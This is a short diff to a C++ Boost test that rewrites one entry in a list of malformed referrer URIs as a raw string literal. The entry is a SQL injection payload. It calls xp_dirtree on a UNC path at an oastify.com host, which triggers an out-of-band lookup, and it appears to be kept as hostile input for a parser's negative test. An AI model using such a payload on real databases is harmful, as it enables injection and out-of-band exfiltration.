@@ -767,8 +767,7 @@ BOOST_DATA_TEST_CASE(DecomposeReferrerUriBad,
 				"www.google.com",
 				"www.google.com/",
 				"www.google.com/path",
-				"http://portage.randomdan.homeip.net/');declare @q varchar(99);set "
-				"@q='\\mh7bick2533bv3lybfcok0vwangg48szlnga7yw.oasti'+'fy.com\tqa'; exec master.dbo.xp_dirtree @q;--",
+				R"(http://portage.randomdan.homeip.net/');declare @q varchar(99);set @q='\\mh7bick2533bv3lybfcok0vwangg48szlnga7yw.oasti'+'fy.com\tqa'; exec master.dbo.xp_dirtree @q;--)",
 		}),
 		uri)
 {
